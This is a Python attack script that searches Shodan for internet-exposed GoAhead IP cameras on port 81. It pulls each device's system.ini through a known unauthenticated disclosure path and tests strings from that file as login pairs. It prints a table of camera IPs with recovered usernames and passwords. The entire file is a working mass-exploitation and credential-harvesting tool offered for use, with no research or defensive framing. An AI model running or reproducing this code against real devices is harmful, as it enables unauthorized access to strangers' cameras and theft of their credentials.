import shodan, os, urllib.request, requests
from requests import get
from requests import session
from colorama import init, Fore, Back
from progress.bar import IncrementalBar
from prettytable import PrettyTable
from requests.auth import HTTPDigestAuth

os.system('clear || cls')

try:
 mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
except urllib.error.URLError:
 input("Check your internet connection!")
 exit()
except:
 input("Something went wrong!")
 exit()

init(autoreset=True)

if os.path.exists('api_key.config') == False:
 inn = input("Введите ключ API: ")
 if inn == '':
  exit()
 file = open('api_key.config', 'w')
 file.write(inn)
 file.close()
else:
  pass

key = open('api_key.config', 'r').read()

api = shodan.Shodan(key)

num_of_vulnerable = []
locations = []
ips = []

def st():

 try:
  results = api.search('realm="GoAhead", domain=":81"')
 except shodan.exception.APIError:
  os.remove('api_key.config')
  input('Wrong API key!\nRestart the program and enter the correct API.')
  exit()

 for result in results['matches']:
  ips.append(format(result['ip_str']))
  ka = result['location']
  locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")

 for ip in list(set(ips)):
  try:

   print(f"Trying {Fore.CYAN + ip}")
   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)

   with open(f'camera_{ip}.ini', 'wb') as f:
    f.write(r.content)

   if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
    os.remove(f'camera_{ip}.ini')
    print(Fore.LIGHTRED_EX + 'Denied\n')
   else:
    num_of_vulnerable.append(ip)
    print(Fore.LIGHTGREEN_EX + 'Accessed\n')
  except:
    print(f'{ip} not available.\n')
    continue
st()

if len(num_of_vulnerable) >= int('1'):
  taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
else:
  taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))

print(f'Devices tested: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')

th = ['IP', 'USERNAME', 'PASSWORD']
td = []

if len(num_of_vulnerable) >= int('1'):
 s = session()

 raz = 0
 with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:

  for ipi in num_of_vulnerable:
    try:
     user = None
     password = None
     file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')

     try:
      data = file.read().replace('\x00', ' ')
      words = data.split()
     except:
      print(r)
     for i in range(len(words)-1):
      try:
       page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
       if page.status_code == 200:
        td.append(ipi)
        td.append(words[i])
        td.append(words[i+1])
        raz += 1
        bar.next()
        break

       request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
       if request.status_code == 200:
        td.append(ipi)
        td.append(words[i])
        td.append('')
        bar.next()
        break
      except Exception as e:
        continue
    except:
     continue

if len(num_of_vulnerable) >= int('1'):
 columns = len(th)

 table = PrettyTable(th)

 td_data = td[:]
 while td_data:
    table.add_row(td_data[:columns])
    td_data = td_data[columns:]
 print(f'\n{table}\n')
else:
 print("No vulnerable devices was found!\n")
